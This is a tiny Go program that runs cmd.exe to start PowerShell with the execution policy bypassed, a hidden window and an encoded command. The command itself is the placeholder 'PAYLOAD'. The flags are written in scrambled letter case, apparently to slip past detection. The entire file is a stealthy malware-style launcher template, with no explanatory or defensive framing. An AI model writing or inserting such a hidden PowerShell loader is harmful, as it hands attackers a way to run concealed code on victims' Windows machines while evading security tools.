package main

import(
	"fmt"
	"os/exec"
)

func main() {

	cmd := exec.Command("cmd.exe", "/c", "PowErShell.exe -ExeC ByPaSs -Nol -WinDowStyLe HiddEn -eNc PAYLOAD")
	if err := cmd.Run(); err != nil {
    	fmt.Println("Error: ", err)
	}
}